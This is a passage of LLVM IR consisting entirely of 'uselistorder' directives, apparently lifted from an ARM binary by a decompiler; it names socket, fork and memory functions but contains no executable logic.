  uselistorder i1 %v7_13200, { 1, 0 }
  uselistorder i32 %v3_131ec, { 2, 3, 0, 1 }
  uselistorder i32 %v0_131dc.pre, { 0, 2, 1 }
  uselistorder i32 %v1_131c4, { 1, 0 }
  uselistorder i32 %v1_131c0, { 1, 0 }
  uselistorder i32 %v1_131b8, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_131b4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_131b4, { 0, 2, 1 }
  uselistorder i1 %v7_1315c, { 1, 0 }
  uselistorder i1 %v2_13148, { 1, 0, 2 }
  uselistorder i1 %v2_13130, { 1, 0, 2 }
  uselistorder i32 %v1_13150, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v1_13124, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v1_1314c, { 1, 0 }
  uselistorder i32 %v2_13154, { 0, 1, 4, 2, 3, 5 }
  uselistorder i32 %v0_130cc, { 4, 19, 5, 17, 6, 18, 7, 16, 8, 15, 9, 14, 10, 13, 3, 0, 11, 12, 20, 2, 1 }
  uselistorder i32 %v1_130a8, { 1, 2, 3, 0 }
  uselistorder i32 %v3_130a4, { 1, 0 }
  uselistorder i32 %v4_13088, { 0, 4, 1, 2, 3, 5, 6, 7 }
  uselistorder i32 %v2_13074, { 1, 0, 2 }
  uselistorder i32 %v3_13070, { 1, 0, 2 }
  uselistorder i32 %v0_13a44, { 1, 0, 2 }
  uselistorder i32 %v5_13038, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_13018, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_12fd0, { 0, 3, 2, 4, 6, 5, 1 }
  uselistorder i32 %v2_12fa4, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_12f9c, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_12f30, { 2, 1, 0 }
  uselistorder i32 %v3_12f2c, { 1, 0 }
  uselistorder i1 %v7_12f14, { 1, 0 }
  uselistorder i32 %v3_12f10, { 5, 4, 2, 1, 0, 6, 7, 3 }
  uselistorder i32 %v0_12f04, { 1, 0 }
  uselistorder i32 %v1_12ee8, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_12ed4, { 2, 1, 0 }
  uselistorder i32 %v3_12ed0, { 1, 0 }
  uselistorder i32 %v0_12ed4, { 1, 0 }
  uselistorder i32 %v2_13530, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v2_1347c, { 5, 4, 6, 3, 2, 7, 8, 1, 0 }
  uselistorder i32 %v2_13908, { 1, 2, 0 }
  uselistorder i32 %v2_13114, { 0, 1, 3, 2 }
  uselistorder i32 %v1_12e68, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12e68, { 0, 1, 3, 2 }
  uselistorder i32 %v1_12e44, { 2, 1, 0 }
  uselistorder i32 %v1_12e40, { 1, 0 }
  uselistorder i32 %v0_12e10, { 0, 2, 1 }
  uselistorder i32 %v1_12e08, { 1, 0 }
  uselistorder i1 %v7_12dd4, { 0, 3, 1, 2 }
  uselistorder i1 %v2_12dd4, { 1, 2, 0 }
  uselistorder i32 %v2_12dcc, { 0, 3, 4, 2, 1 }
  uselistorder i32 %v0_12dc4, { 1, 0 }
  uselistorder i32 %v1_12da8, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 %v1_12d9c, { 0, 1, 3, 2 }
  uselistorder i32 %v0_12d9c, { 0, 2, 1 }
  uselistorder i32 %v1_12d8c, { 1, 0 }
  uselistorder i32 %v3_12df0, { 4, 7, 5, 6, 1, 0, 9, 3, 2, 8 }
  uselistorder i32 %storemerge222, { 1, 0, 2 }
  uselistorder i32 %v2_12dfc, { 0, 4, 1, 5, 2, 7, 3, 6 }
  uselistorder i32 %stack_var_-1868.0, { 1, 0, 2, 3 }
  uselistorder i32 %v3_12cdc, { 1, 0 }
  uselistorder i32 %v1_12cc8, { 1, 0 }
  uselistorder i32 %v1_12cb0, { 1, 2, 0 }
  uselistorder i32 %v0_12cbc, { 0, 3, 2, 1 }
  uselistorder i32 %v0_12c80, { 2, 1, 0, 3, 5, 4 }
  uselistorder i32 %v2_12c74, { 2, 1, 0 }
  uselistorder i32 %v1_12c50, { 3, 1, 0, 4, 2 }
  uselistorder i1 %v2_12c28, { 1, 0 }
  uselistorder i32 %v4_12bc8, { 2, 3, 7, 0, 1, 5, 4, 6 }
  uselistorder i32 %v1_12b30, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v4_12a50, { 1, 0 }
  uselistorder i32 %v1_12a4c, { 1, 0 }
  uselistorder i32 %v4_12a28, { 1, 0 }
  uselistorder i1 %v2_12998, { 1, 0 }
  uselistorder i1 %v3_1297c, { 1, 0, 2 }
  uselistorder i1 %v2_12968, { 1, 0 }
  uselistorder i1 %v2_12944, { 1, 0 }
  uselistorder i32 %v1_128f4, { 14, 13, 12, 11, 15, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_128e0, { 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 20, 21, 22, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 6, 7, 8, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_128dc, { 4, 5, 6, 7, 0, 8, 1, 2, 3, 9 }
  uselistorder i32 %v4_128cc, { 1, 0 }
  uselistorder i32 %v0_128bc, { 0, 1, 3, 2 }
  uselistorder i32 %v0_128ac, { 1, 0 }
  uselistorder i32 %v0_12bbc, { 0, 1, 2, 5, 6, 7, 10, 9, 3, 4, 8 }
  uselistorder i8* %stack_var_-1884.0, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 %stack_var_-1872.0, { 0, 3, 2, 1 }
  uselistorder i32 %v4_12480, { 1, 0 }
  uselistorder i32 %v4_12420, { 1, 0 }
  uselistorder i32 %v0_12418, { 0, 1, 3, 2 }
  uselistorder i32 %v0_123c0, { 3, 2, 0, 1 }
  uselistorder i1 %v7_12364, { 1, 0 }
  uselistorder i32 %v3_1235c, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v0_12344, { 0, 2, 1 }
  uselistorder i32 %v0_1232c, { 2, 1, 0 }
  uselistorder i32 %v0_12308, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %storemerge229, { 1, 0 }
  uselistorder i32 %v0_122a0, { 1, 2, 3, 0, 4 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 13, 11, 12 }
  uselistorder i32* %stack_var_-92, { 3, 0, 1, 2, 4 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-48, { 2, 3, 1, 4, 0, 5, 6, 7 }
  uselistorder i32* %stack_var_-56, { 5, 6, 2, 7, 3, 8, 4, 9, 1, 10, 0, 11, 12 }
  uselistorder i32* %stack_var_-84, { 1, 0 }
  uselistorder i32* %stack_var_-38, { 1, 0 }
  uselistorder i32 %tmp239, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32* %r5.global-to-local, { 3, 1, 2, 0, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0, 8, 9, 10 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 64, 65, 44, 36, 66, 67, 68, 69, 70, 13, 14, 45, 46, 47, 48, 0, 1, 2, 3, 15, 63, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 39, 40, 41, 57, 58, 59, 42, 43, 49, 50, 51, 52, 53, 54, 55, 56, 71, 72, 73, 74, 75, 76, 60, 61, 77, 78, 80, 79, 81, 82, 83, 84, 86, 88, 87, 85, 89, 90, 91, 92, 98, 93, 94, 95, 96, 99, 137, 138, 100, 139, 140, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 62, 119, 120, 121, 122, 123, 124, 126, 125, 128, 127, 97, 129, 130, 131, 132, 133, 134, 135, 136, 141, 142, 143, 144 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 50, 35, 31, 51, 36, 37, 38, 0, 1, 2, 42, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 24, 23, 25, 27, 26, 28, 30, 29, 32, 34, 33, 43, 44, 45, 39, 40, 41, 52, 53, 54, 55, 56, 57, 58, 46, 71, 59, 60, 61, 62, 63, 65, 67, 66, 47, 64, 68, 69, 70, 72, 76, 73, 74, 75, 77, 79, 81, 80, 78, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 48, 49, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 161, 160, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172 }
  uselistorder i32* %r1.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 50, 51, 52, 39, 40, 36, 15, 16, 41, 42, 1, 2, 3, 43, 48, 49, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 37, 38, 44, 45, 0, 53, 54, 55, 46, 47, 56, 57, 58, 60, 61, 59, 62, 63, 65, 64, 150, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 148, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 149 }
  uselistorder i32* %r0.global-to-local, { 13, 12, 15, 14, 16, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 28, 27, 29, 31, 30, 33, 32, 1, 34, 131, 130, 36, 133, 132, 109, 112, 111, 101, 100, 134, 136, 135, 35, 38, 37, 39, 114, 113, 115, 3, 2, 4, 6, 5, 8, 7, 9, 10, 11, 119, 118, 41, 40, 42, 44, 43, 45, 46, 48, 47, 49, 51, 50, 52, 54, 53, 55, 56, 57, 58, 59, 60, 62, 61, 64, 63, 66, 65, 67, 68, 69, 70, 72, 71, 74, 73, 76, 75, 77, 78, 79, 80, 82, 81, 84, 83, 86, 85, 87, 88, 89, 90, 92, 91, 94, 93, 96, 95, 97, 98, 99, 103, 102, 110, 104, 105, 106, 121, 120, 123, 122, 107, 108, 117, 116, 140, 137, 138, 125, 124, 126, 127, 139, 141, 142, 143, 145, 144, 146, 152, 147, 148, 151, 149, 150, 153, 155, 156, 154, 158, 157, 159, 161, 160, 162, 164, 163, 129, 165, 166, 167, 0, 168, 169, 171, 170, 172, 173, 174, 175, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 237, 236, 238, 242, 241, 239, 240, 243, 244, 128, 245 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 3, 2, 4, 5, 6, 15, 7, 8, 9, 10, 11, 12, 13, 14, 16, 17, 18 }
  uselistorder i32* %ip.global-to-local, { 22, 23, 2, 24, 3, 16, 0, 1, 20, 4, 5, 7, 6, 9, 8, 11, 10, 12, 13, 14, 19, 15, 21, 17, 18, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 46, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 47, 48, 49, 50 }
  uselistorder i1* %cpsr_z.global-to-local, { 9, 55, 110, 109, 111, 112, 113, 10, 11, 72, 73, 74, 75, 76, 0, 1, 6, 7, 2, 3, 4, 5, 8, 91, 12, 13, 14, 99, 15, 16, 17, 18, 19, 20, 25, 26, 21, 22, 23, 24, 27, 28, 29, 34, 35, 30, 31, 32, 33, 36, 37, 38, 43, 44, 39, 40, 41, 42, 45, 46, 47, 52, 53, 48, 49, 50, 51, 54, 56, 57, 61, 62, 58, 59, 60, 63, 93, 64, 69, 70, 65, 66, 67, 68, 71, 92, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 100, 114, 115, 116, 117, 118, 119, 108, 101, 94, 95, 120, 122, 121, 123, 124, 126, 128, 127, 102, 125, 129, 130, 131, 132, 133, 134, 139, 135, 136, 137, 138, 105, 106, 103, 104, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 157, 156, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 98, 175, 176, 177, 178, 179, 97, 180, 181, 182, 96, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 107, 196 }
  uselistorder i1* %cpsr_c.global-to-local, { 9, 10, 11, 57, 108, 109, 110, 111, 112, 12, 74, 75, 76, 77, 0, 1, 6, 7, 2, 3, 4, 5, 8, 90, 13, 14, 15, 98, 16, 17, 18, 19, 20, 21, 22, 27, 28, 23, 24, 25, 26, 29, 30, 31, 36, 37, 32, 33, 34, 35, 38, 39, 40, 45, 46, 41, 42, 43, 44, 47, 48, 49, 54, 55, 50, 51, 52, 53, 56, 58, 59, 63, 64, 60, 61, 62, 65, 92, 66, 71, 72, 67, 68, 69, 70, 73, 91, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 99, 113, 114, 115, 116, 117, 118, 107, 100, 93, 94, 119, 121, 120, 122, 124, 126, 125, 101, 123, 127, 128, 129, 130, 131, 136, 132, 133, 134, 135, 104, 105, 102, 137, 103, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 97, 168, 169, 170, 171, 172, 96, 173, 174, 175, 95, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 106, 193 }
  uselistorder i32 (i32, i32)* @function_11a9c, { 1, 0 }
  uselistorder i32 104, { 0, 3, 1, 4, 2, 5 }
  uselistorder i8 31, { 8, 2, 3, 0, 1, 4, 5, 9, 10, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
  uselistorder i32 (i32, i32, i32)* @_memcpy, { 4, 3, 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @_memmove, { 5, 6, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_13c30, { 35, 34, 36, 33, 32, 31, 30, 29, 28, 27, 37, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32*)* @function_13c04, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58 }
  uselistorder i32 (i32)* @function_13ce8, { 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_14f60.88 to i32), { 4, 23, 2, 24, 3, 25, 1, 26, 0, 27, 10, 28, 9, 29, 19, 30, 8, 31, 22, 32, 20, 33, 21, 34, 5, 35, 6, 36, 7, 37, 11, 38, 12, 39, 13, 40, 14, 41, 15, 42, 16, 43, 17, 44, 18, 45 }
  uselistorder i8 58, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 57, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 62, { 6, 4, 5, 3, 2, 1, 0 }
  uselistorder i8 61, { 6, 4, 5, 3, 2, 1, 0, 7, 8 }
  uselistorder i8 37, { 5, 3, 4, 2, 1, 0 }
  uselistorder i8 34, { 6, 4, 5, 3, 2, 1, 0, 7, 8, 9, 10 }
  uselistorder i8 36, { 11, 12, 7, 8, 9, 10, 5, 6, 3, 4, 2, 0, 1 }
  uselistorder i8 35, { 12, 13, 8, 9, 10, 11, 6, 7, 4, 5, 2, 3, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @_send, { 30, 29, 28, 27, 26, 25, 24, 13, 32, 31, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 11, 10, 12, 5, 9, 8, 7, 6, 4, 3, 2, 1, 0 }
  uselistorder i32 251, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i8 -3, { 1, 2, 3, 0 }
  uselistorder i8 -4, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @_recv, { 4, 9, 8, 7, 6, 5, 3, 2, 0, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @function_146d0, { 22, 24, 23, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 1, 0, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i8* bitcast (i8** @global_var_1d9a4.249 to i8*), { 4, 0, 3, 2, 1 }
  uselistorder i8* @global_var_1d9a5.250, { 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @_getsockopt, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @_select, { 1, 2, 3, 0 }
  uselistorder i32 284, { 3, 4, 5, 6, 0, 1, 2, 7 }
  uselistorder i32 1544, { 1, 0 }
  uselistorder i32* @sp, { 4, 1, 5, 0, 6, 2, 7, 3 }
  uselistorder i32 1672, { 2, 0, 1 }
  uselistorder i32 (i32)* @_exit, { 6, 5, 3, 4, 2, 1, 0 }
  uselistorder i32 ()* @function_12020, { 3, 2, 1, 0 }
  uselistorder i32 254, { 9, 10, 11, 0, 1, 2, 3, 4, 12, 5, 13, 6, 14, 7, 15, 8, 16 }
  uselistorder i8 2, { 0, 2, 4, 3, 1 }
  uselistorder i32 5888, { 1, 0 }
  uselistorder i32 39, { 5, 0, 1, 6, 2, 7, 3, 8, 4 }
  uselistorder i32 38, { 3, 4, 5, 6, 7, 0, 8, 1, 9, 2, 10 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @_recvfrom, { 1, 3, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @_sendto, { 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 16384, { 34, 56, 35, 57, 36, 58, 37, 59, 38, 60, 39, 61, 13, 62, 12, 73, 11, 54, 0, 55, 1, 63, 2, 64, 3, 65, 4, 66, 5, 67, 6, 68, 7, 69, 8, 70, 32, 71, 33, 72, 30, 75, 31, 76, 29, 74, 40, 97, 9, 98, 10, 99, 14, 84, 41, 85, 16, 77, 44, 78, 43, 79, 45, 80, 46, 81, 15, 82, 42, 83, 17, 86, 18, 87, 19, 88, 47, 48, 49, 50, 20, 89, 21, 90, 23, 91, 22, 92, 25, 93, 24, 94, 26, 95, 27, 96, 52, 100, 53, 101, 28, 102, 51, 103 }
  uselistorder i32 (i32, i32, i32, i32)* @function_fdfc, { 1, 9, 8, 0, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32)* @function_fda0, { 1, 11, 10, 0, 9, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i8* @global_var_1d988.372, { 2, 1, 0 }
  uselistorder i32 16711680, { 3, 0, 1, 2 }
  uselistorder i32 214, { 1, 0 }
  uselistorder i32 28, { 2, 3, 4, 5, 6, 7, 8, 0, 1, 17, 16, 9, 10, 11, 12, 13, 14, 15, 18, 19, 20 }
  uselistorder i32 20, { 19, 12, 20, 13, 21, 14, 22, 94, 1, 95, 2, 96, 18, 23, 24, 3, 25, 26, 27, 28, 29, 30, 31, 4, 32, 33, 34, 35, 36, 37, 38, 39, 40, 5, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 6, 53, 54, 55, 56, 57, 58, 59, 60, 7, 61, 62, 63, 0, 64, 65, 66, 67, 15, 68, 69, 70, 71, 72, 73, 74, 75, 76, 16, 77, 78, 79, 80, 81, 82, 83, 84, 9, 85, 8, 86, 87, 88, 89, 11, 90, 10, 91, 92, 93, 97, 98, 99, 100, 101, 102, 103, 104, 105, 17, 106 }
  uselistorder i32 223, { 4, 0, 1, 2, 3 }
  uselistorder i32 31, { 10, 9, 19, 11, 3, 12, 16, 13, 17, 14, 18, 15, 7, 8, 4, 0, 5, 1, 2, 6 }
  uselistorder i32 30, { 0, 8, 4, 1, 5, 2, 6, 3, 7, 9 }
  uselistorder i32 14, { 8, 2, 3, 4, 5, 6, 9, 10, 7, 11, 12, 13, 14, 0, 15, 16, 17, 18, 1, 19 }
  uselistorder i32 192, { 2, 3, 4, 0, 1 }
  uselistorder i32 56, { 3, 2, 0, 1 }
  uselistorder i32 127, { 5, 0, 6, 3, 7, 1, 8, 2, 9, 4, 10 }
  uselistorder i32 126, { 11, 5, 0, 6, 1, 7, 2, 8, 3, 9, 4, 10 }
  uselistorder i32 ptrtoint (i32* @global_var_1513c.350 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_150d4.328 to i32), { 0, 5, 1, 6, 2, 3, 4, 7 }
  uselistorder i32 ptrtoint ([7 x i8]* @global_var_150b8.322 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_15098.316 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_15090.314 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_1507c.310 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_15068.306 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_15060.304 to i32), { 0, 4, 1, 2, 3, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_15058.302 to i32), { 0, 4, 1, 5, 2, 6, 3, 7 }
  uselistorder i32 ptrtoint ([9 x i8]* @global_var_1504c.300 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 ptrtoint (i32* @global_var_14f88.298 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_15200.294 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_151f8.292 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_151d4.284 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_151cc.282 to i32), { 0, 18, 1, 19, 2, 20, 3, 21, 4, 22, 5, 23, 6, 24, 7, 25, 8, 26, 9, 27, 10, 28, 11, 29, 12, 30, 13, 31, 14, 15, 16, 32, 17, 33 }
  uselistorder i32 (i32, i32, i32)* @function_120f4, { 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_151b4.276 to i32), { 0, 34, 1, 35, 2, 36, 3, 37, 4, 38, 5, 39, 6, 40, 7, 41, 8, 42, 9, 43, 10, 44, 11, 45, 12, 46, 13, 47, 14, 48, 15, 49, 16, 50, 17, 51, 18, 52, 19, 53, 20, 54, 21, 22, 23, 55, 24, 56, 25, 57, 26, 58, 27, 59, 28, 60, 29, 61, 30, 62, 31, 63, 32, 64, 33, 65 }
  uselistorder i8* @global_var_1d999.272, { 1, 0 }
  uselistorder i32 80, { 3, 1, 2, 0, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1d98c.263 to i32), { 3, 2, 4, 5, 0, 6, 1, 7, 8 }
  uselistorder i8 64, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder i8* @global_var_1d998.264, { 1, 0 }
  uselistorder i32 40, { 0, 25, 26, 6, 1, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 3, 27, 4, 28, 2, 29, 5, 30 }
  uselistorder i8** @global_var_1d978.259, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1d978.259 to i32), { 1, 0, 3, 2, 10, 9, 4, 8, 7, 6, 5 }
  uselistorder i32 1024, { 2, 1, 3, 4, 5, 0, 6 }
  uselistorder i32 1023, { 4, 0, 1, 2, 5, 3, 6 }
  uselistorder i32 65280, { 60, 1, 17, 0, 2, 34, 3, 35, 24, 25, 4, 36, 18, 26, 37, 38, 5, 39, 40, 6, 7, 41, 19, 8, 42, 27, 20, 21, 28, 29, 30, 43, 44, 45, 46, 9, 10, 31, 32, 33, 47, 48, 49, 50, 11, 12, 51, 13, 52, 53, 22, 54, 55, 14, 56, 57, 23, 58, 59, 15, 61, 16, 62 }
  uselistorder i32 ()* @function_117dc, { 76, 8, 7, 6, 5, 4, 2, 72, 75, 74, 73, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 3, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @_setsockopt, { 1, 11, 10, 9, 2, 8, 7, 3, 6, 5, 4, 0 }
  uselistorder i32 2048, { 15, 14, 5, 8, 9, 0, 1, 2, 3, 7, 10, 6, 11, 4, 12, 13, 16 }
  uselistorder i32 (i32, i32, i32)* @_fcntl, { 3, 2, 7, 6, 13, 12, 15, 14, 11, 10, 5, 4, 9, 8, 1, 0 }
  uselistorder i32* @global_var_1d9cc.257, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* @global_var_1d9c8.255, { 1, 2, 3, 4, 0 }
  uselistorder i32 (i32, i32)* @_calloc, { 1, 42, 41, 40, 39, 38, 37, 2, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 288, { 1, 2, 5, 6, 0, 7, 3, 4, 8 }
  uselistorder i32* @global_var_1d9a8.243, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32 (i32)* @_time, { 7, 3, 2, 11, 10, 6, 5, 9, 8, 4, 1, 0 }
  uselistorder i32* @global_var_1d9ac.143, { 3, 4, 2, 0, 5, 1, 6, 14, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 ()* @function_148c4, { 0, 2, 1 }
  uselistorder i32* @global_var_1d9d0.241, { 0, 2, 1 }
  uselistorder i32 ()* @_fork, { 5, 0, 4, 3, 2, 1 }
  uselistorder i32* @fp, { 2, 3, 4, 5, 6, 52, 53, 45, 46, 47, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 0, 42, 43, 44, 48, 1, 49, 50, 51 }
  uselistorder i32* @sl, { 1, 2, 3, 4, 5, 6, 82, 83, 66, 67, 68, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 0, 106, 107, 108, 109 }
  uselistorder i32* @sb, { 2, 3, 6, 0, 1, 4, 5, 60, 59, 7, 8, 61, 62, 50, 51, 52, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 53, 54, 55, 56, 57, 58, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72 }
